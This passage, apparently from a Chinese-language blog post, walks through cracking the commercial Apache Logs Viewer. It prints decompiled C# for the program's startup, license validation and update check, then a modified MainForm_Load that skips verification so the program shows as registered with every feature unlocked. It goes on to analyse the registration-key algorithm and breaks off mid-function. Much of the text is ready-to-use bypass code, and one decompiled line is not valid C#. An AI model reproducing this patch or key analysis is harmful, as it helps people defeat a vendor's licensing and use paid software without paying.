class="keyword">this</span>.lbStatusStripNotify.Text = Class96.smethod_270() + <span class="string">" Apache Logs Viewer..."</span> + Class96.smethod_67();</span><br><span class="line"><span class="keyword">this</span>.method_2(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.lbStatusStripNotify.Text = Class96.smethod_270() + <span class="string">" Apache Logs Viewer"</span>;</span><br><span class="line"><span class="keyword">this</span>.method_2(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">"Apply L..."</span>);</span><br><span class="line"><span class="keyword">this</span>.method_44(<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">this</span>.method_1();</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">"Apply L Done"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception ex)</span><br><span class="line">&#123;</span><br><span class="line">ALV.Common.Debug.Error(<span class="string">"Error Load: "</span> + ex.Message);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.prefs_0 == <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.prefs_0 = <span class="keyword">new</span> Prefs();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line">LoadForm.smethod_1();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.prefs_0.checkupdates)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">new</span> Thread(<span class="keyword">new</span> ThreadStart(<span class="keyword">this</span>.method_25)).Start();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>.bool_1)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (File.Exists(Prefs.Filename + <span class="string">".chk"</span>))</span><br><span class="line">&#123;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">"Config Check"</span>);</span><br><span class="line"><span class="keyword">if</span> (File.ReadAllText(Prefs.Filename + <span class="string">".chk"</span>) == <span class="string">"0"</span>)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox.Show(<span class="keyword">this</span>, Class96.smethod_53(), <span class="string">"Apache Logs Viewer"</span>, MessageBoxButtons.OK, MessageBoxIcon.Hand);</span><br><span class="line"><span class="keyword">this</span>.prefs_0.Key = <span class="keyword">string</span>.Empty;</span><br><span class="line"><span class="keyword">this</span>.unlockCodeToolStripMenuItem_Click(<span class="keyword">this</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (File.Exists(Prefs.Filename + <span class="string">".chk"</span>) &amp;&amp; <span class="keyword">this</span>.bool_0)</span><br><span class="line">&#123;</span><br><span class="line">Application.Exit();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.bool_0)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">new</span> Thread(<span class="keyword">new</span> ThreadStart(<span class="keyword">this</span>.method_23)).Start();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.bool_0)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">new</span> Thread(<span class="keyword">new</span> ThreadStart(<span class="keyword">this</span>.method_23)).Start();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.timer_0.Interval = <span class="keyword">this</span>.prefs_0.refreshtimeout * <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">this</span>.timer_0.Enabled = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">this</span>.timer_0.Start();</span><br><span class="line">GC.Collect();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">base</span>.Width &lt;= <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Width = <span class="number">668</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">base</span>.Height &lt;= <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Height = <span class="number">460</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.Visible = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">this</span>.toolStripBtnScroll.CheckState = (<span class="keyword">this</span>.prefs_0.scroll_last ? CheckState.Checked : CheckState.Unchecked);</span><br><span class="line"><span class="keyword">this</span>.toolStripBtnRefresh.CheckState = (<span class="keyword">this</span>.prefs_0.refreshAuto ? CheckState.Checked : CheckState.Unchecked);</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">"Started..OK"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>method_23</code>、<code>method_24</code>方法用作反馈<code>winstore</code>版本</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method_23</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.bool_1)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.method_24(<span class="string">"winStore"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.method_24(<span class="keyword">this</span>.prefs_0.Key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method_24</span>(<span class="params"><span class="keyword">string</span> string_0</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">WebClient webClient = <span class="keyword">new</span> WebClient();</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (webClient.DownloadString(<span class="string">"http://www.apacheviewer.com/k/c5.php?k="</span> + string_0 + <span class="string">"&amp;id="</span> + <span class="keyword">this</span>.prefs_0.InstallID).StartsWith(<span class="string">"failed"</span>, StringComparison.OrdinalIgnoreCase))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">using</span> (StreamWriter streamWriter = File.CreateText(Prefs.Filename + <span class="string">".chk"</span>))</span><br><span class="line">&#123;</span><br><span class="line">streamWriter.Write(<span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">base</span>.Invoke(<span class="keyword">new</span> MainForm.Delegate0(<span class="keyword">this</span>.method_26), <span class="keyword">new</span> <span class="keyword">object</span>[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">5</span>,</span><br><span class="line"><span class="keyword">string</span>.Empty</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (File.Exists(Prefs.Filename + <span class="string">".chk"</span>))</span><br><span class="line">&#123;</span><br><span class="line">File.Delete(Prefs.Filename + <span class="string">".chk"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line">((IDisposable)webClient).Dispose();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>method_25</code>、<code>method_26</code>用作检测更新</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method_25</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">string</span> text = <span class="literal">null</span>;</span><br><span class="line">WebClient webClient = <span class="keyword">new</span> WebClient();</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.bool_0)</span><br><span class="line">&#123;</span><br><span class="line">text = webClient.DownloadString(<span class="keyword">string</span>.Concat(<span class="keyword">new</span> <span class="keyword">object</span>[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"http://www.apacheviewer.com/currentver5.php?v="</span>,</span><br><span class="line">About.double_0,</span><br><span class="line"><span class="string">"&amp;r1=U&amp;id="</span>,</span><br><span class="line"><span class="keyword">this</span>.prefs_0.InstallID</span><br><span class="line">&#125;));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">text = webClient.DownloadString(<span class="keyword">string</span>.Concat(<span class="keyword">new</span> <span class="keyword">object</span>[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"http://www.apacheviewer.com/currentver5.php?v="</span>,</span><br><span class="line">About.double_0,</span><br><span class="line"><span class="string">"&amp;r1=F&amp;id="</span>,</span><br><span class="line"><span class="keyword">this</span>.prefs_0.InstallID</span><br><span class="line">&#125;));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line">((IDisposable)webClient).Dispose();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">string</span>.IsNullOrEmpty(text))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">double</span> num = <span class="number">0.0</span>;</span><br><span class="line"><span class="keyword">double</span>.TryParse(text, NumberStyles.Any, CultureInfo.InvariantCulture, <span class="keyword">out</span> num);</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">0.0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (num &gt; About.double_0)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (num &gt;= (<span class="keyword">double</span>)About.int_0)</span><br><span class="line">&#123;</span><br><span class="line">WebClient webClient2 = <span class="keyword">new</span> WebClient();</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">text = webClient2.DownloadString(<span class="string">"http://www.apacheviewer.com/upgrademsg.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line">((IDisposable)webClient2).Dispose();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">base</span>.Invoke(<span class="keyword">new</span> MainForm.Delegate0(<span class="keyword">this</span>.method_26), <span class="keyword">new</span> <span class="keyword">object</span>[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">2</span>,</span><br><span class="line">text.Trim()</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Invoke(<span class="keyword">new</span> MainForm.Delegate0(<span class="keyword">this</span>.method_26), <span class="keyword">new</span> <span class="keyword">object</span>[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">1</span>,</span><br><span class="line">text.Trim()</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">method_26</span>(<span class="params"><span class="keyword">int</span> int_0, <span class="keyword">string</span> string_0</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (int_0)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">if</span> (MessageBox.Show(<span class="keyword">string</span>.Concat(<span class="keyword">new</span> <span class="keyword">string</span>[]</span><br><span class="line">&#123;</span><br><span class="line">Class96.smethod_42(),</span><br><span class="line"><span class="string">" v"</span>,</span><br><span class="line">string_0,</span><br><span class="line"><span class="string">" "</span>,</span><br><span class="line">Class96.smethod_93(),</span><br><span class="line"><span class="string">".\r\n "</span>,</span><br><span class="line">Class96.smethod_66()</span><br><span class="line">&#125;), <span class="string">"Apache Logs Viewer "</span> + Class96.smethod_265(), MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)</span><br><span class="line">&#123;</span><br><span class="line">Process.Start(<span class="string">"http://www.apacheviewer.com/download.php?up=1"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="keyword">if</span> (MessageBox.Show(string_0 + <span class="string">"\r\n"</span> + Class96.smethod_66(), <span class="string">"Apache Logs Viewer "</span> + Class96.smethod_265(), MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)</span><br><span class="line">&#123;</span><br><span class="line">Process.Start(<span class="string">"http://www.apacheviewer.com/download.php?up=1"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"><span class="keyword">goto</span> IL_BD;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">MessageBox.Show(Class96.smethod_123(), <span class="string">"Apache Logs Viewer"</span>, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);</span><br><span class="line">Process.Start(<span class="string">"http://www.apacheviewer.com"</span>);</span><br><span class="line">Application.Exit();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">goto</span> IL_BD;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">IL_BD:</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ApplicationException(<span class="string">"Unknown Update UI Command"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以把<code>MainForm_Load</code>方法直接修改为如下即可跳过验证和更新</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">MainForm_Load</span>(<span class="params"><span class="keyword">object</span> sender, EventArgs e</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Class95.bool_2)</span><br><span class="line">&#123;</span><br><span class="line">Prefs.DeletePrefs();</span><br><span class="line">&#125;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">"Started.."</span>);</span><br><span class="line">Prefs prefs = Prefs.Load(Prefs.Filename);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">string</span>.IsNullOrEmpty(prefs.InstallID))</span><br><span class="line">&#123;</span><br><span class="line">prefs.InstallID = Guid.NewGuid().ToString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (prefs.sizex &gt; <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Width = prefs.sizex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (prefs.sizey &gt; <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Height = prefs.sizey;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (prefs.maximised)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.WindowState = FormWindowState.Maximized;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (prefs.x &gt;= <span class="number">0</span> &amp;&amp; prefs.y &gt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Location = <span class="keyword">new</span> Point(prefs.x, prefs.y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.prefs_0 = prefs;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.prefs_0.logColumns == <span class="literal">null</span> || <span class="keyword">this</span>.prefs_0.logColumns.Count &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.prefs_0.logColumns = LogColumn.ResetLogColumns();</span><br><span class="line">&#125;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">"Loading Custom Columns"</span>);</span><br><span class="line"><span class="keyword">this</span>.prefsColumns_0 = PrefsColumns.Load(PrefsColumns.Filename);</span><br><span class="line"><span class="keyword">this</span>.method_42();</span><br><span class="line">DummyListView.prefs = prefs;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">"Loading IP DB"</span>);</span><br><span class="line"><span class="keyword">this</span>.ip2Country_0 = <span class="keyword">new</span> IP2Country(<span class="literal">true</span>, <span class="keyword">this</span>.prefs_0.useCity);</span><br><span class="line"><span class="keyword">this</span>.parser_0 = <span class="keyword">new</span> Parser(<span class="keyword">this</span>.ip2Country_0);</span><br><span class="line"><span class="keyword">this</span>.parser_0.ParseCustomColumns = <span class="keyword">this</span>.prefs_0.parseCustomColumns;</span><br><span class="line">Statistics.int_0 = <span class="keyword">this</span>.prefs_0.topNumber;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (prefs.monitorAuto)</span><br><span class="line">&#123;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">"Opening Logs..."</span>);</span><br><span class="line"><span class="keyword">foreach</span> (LoggerInfo loggerInfo <span class="keyword">in</span> prefs.logsToView)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (loggerInfo.Highlight != <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.method_48(loggerInfo.Highlight, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.method_6(loggerInfo);</span><br><span class="line"><span class="keyword">if</span> (Class95.bool_0)</span><br><span class="line">&#123;</span><br><span class="line">GC.Collect();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Class95.list_0 != <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">string</span> text <span class="keyword">in</span> Class95.list_0)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">bool</span> flag = <span class="keyword">this</span>.parser_0.IsErrorLog(text);</span><br><span class="line"><span class="keyword">this</span>.method_4(text, !flag, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (Class95.bool_0)</span><br><span class="line">&#123;</span><br><span class="line">GC.Collect();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox.Show(Class96.smethod_247());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.prefs_0.selTab &gt;= <span class="number">0</span> &amp;&amp; <span class="keyword">this</span>.tabControl1.TabPages.Count &gt; <span class="keyword">this</span>.prefs_0.selTab)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.tabControl1.SelectedTabPageIndex = <span class="keyword">this</span>.prefs_0.selTab;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">string</span>.IsNullOrEmpty(<span class="keyword">this</span>.prefs_0.Key))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">string</span> string_ = Class2.smethod_0(<span class="keyword">this</span>.prefs_0.Key);</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (IsStoreApp.IsWindowsStoreApp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">this</span>.bool_1 = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">this</span>.method_0();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>.bool_0)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.lbStatusStripNotify.Text = Class96.smethod_270() + <span class="string">" Apache Logs Viewer..."</span> + Class96.smethod_67();</span><br><span class="line"><span class="keyword">this</span>.method_2(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.lbStatusStripNotify.Text = Class96.smethod_270() + <span class="string">" Apache Logs Viewer"</span>;</span><br><span class="line"><span class="keyword">this</span>.method_2(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">"Apply L..."</span>);</span><br><span class="line"><span class="keyword">this</span>.method_44(<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">this</span>.method_1();</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">"Apply L Done"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception ex)</span><br><span class="line">&#123;</span><br><span class="line">ALV.Common.Debug.Error(<span class="string">"Error Load: "</span> + ex.Message);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.prefs_0 == <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.prefs_0 = <span class="keyword">new</span> Prefs();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line">LoadForm.smethod_1();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.prefs_0.checkupdates)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">new</span> Thread(<span class="keyword">new</span> ThreadStart(<span class="keyword">this</span>.method_25)).Start();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.timer_0.Interval = <span class="keyword">this</span>.prefs_0.refreshtimeout * <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">this</span>.timer_0.Enabled = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">this</span>.timer_0.Start();</span><br><span class="line">GC.Collect();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">base</span>.Width &lt;= <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Width = <span class="number">668</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">base</span>.Height &lt;= <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Height = <span class="number">460</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.Visible = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">this</span>.toolStripBtnScroll.CheckState = (<span class="keyword">this</span>.prefs_0.scroll_last ? CheckState.Checked : CheckState.Unchecked);</span><br><span class="line"><span class="keyword">this</span>.toolStripBtnRefresh.CheckState = (<span class="keyword">this</span>.prefs_0.refreshAuto ? CheckState.Checked : CheckState.Unchecked);</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">"Started..OK"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新打开后，显示为已注册，所有功能已解锁</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563952799941.png" alt="1563952799941"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563952927165.png" alt=""></p><h1 id="注册算法"><a href="#注册算法" class="headerlink" title="注册算法"></a>注册算法</h1><p>该软件的注册算法如下</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Globalization;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x02000017 RID: 23</span></span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">Class2</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Token: 0x0600008E RID: 142 RVA: 0x0000C090 File Offset: 0x0000A290</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">string</span> <span class="title">smethod_0</span>(<span class="params"><span class="keyword">string</span> string_0</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (string_0.IndexOf(<span class="string">'-'</span>) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> string_0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">string</span> str = <span class="string">"DBV"</span>;</span><br><span class="line">string_0 = string_0.Replace(<span class="string">"-"</span>, <span class="keyword">string</span>.Empty); <span class="comment">//把-置换为空</span></span><br><span class="line">string_0 = string_0.Replace(<span class="string">'Q'</span>, <span class="string">'4'</span>); <span class="comment">//把Q置换为4</span></span><br><span class="line">string_0 = string_0.Replace(<span class="string">'G'</span>, <span class="string">'4'</span>); <span class="comment">//把G置换为4</span></span><br><span class="line">string_0 = string_0.Replace(<span class="string">'V'</span>, <span class="string">'0'</span>); <span class="comment">//把V置换为0</span></span><br><span class="line">string_0 = string_0.Replace(<span class="string">'N'</span>, <span class="string">'3'</span>); <span class="comment">//把N置换为3</span></span><br><span class="line">str + string_0; <span class="comment">//DBV+置换后的</span></span><br><span class="line"><span class="keyword">byte</span>[] array = <span class="keyword">new</span> <span class="keyword">byte</span>[string_0.Length / <span class="number">2</span>];<span class="comment">//新建个数组，长度是传入的字符串的一半</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; string_0.Length; i += <span class="number">2</span>)<span class="comment">//步长2</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">byte</span> b;</span><br><span class="line"><span class="keyword">byte</span>.TryParse(<span class="keyword">new</span> <span class="keyword">string</span>(<span class="keyword">new</span> <span class="keyword">char</span>[]&#123;string_0[i],string_0[i + <span class="number">1</span>]&#125;),NumberStyles.HexNumber, CultureInfo.InvariantCulture, <span class="keyword">out</span> b);</span><br><span class="line">array[i / <span class="number">2</span>] = b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">string</span> text = Encoding.ASCII.GetString(array);</span><br><span class="line">text = text.Insert(<span class="number">1</span>, <span class="string">":"</span>);<span class="comment">//在第1个字符后插入:</span></span><br><span class="line">text = text.Insert(<span class="number">5</span>, <span class="string">":"</span>);<span class="comment">//在第5个字符后插入:</span></span><br><span class="line">text = text.Insert(<span class="number">9</span>, <span class="string">":"</span>);<span class="comment">//在第9个字符后插入:</span></span><br><span class="line"><span class="keyword">if</span> (text.Length &gt; <span class="number">13</span>)<span class="comment">//如果长度超过13，在第14个字符后插入:</span></span><br><span class="line">&#123;</span><br><span class="line">text = text.Insert(<span class="number">13</span>, <span class="string">":"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x0600008F RID: 143 RVA: 0x0000C1A0 File Offset: 0x0000A3A0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// HexNumber = 515</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">smethod_1</span>(<span class="params"><span class="keyword">string</span> string_0</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">string</span> a = string_0.Substring(<span class="number">4</span>, 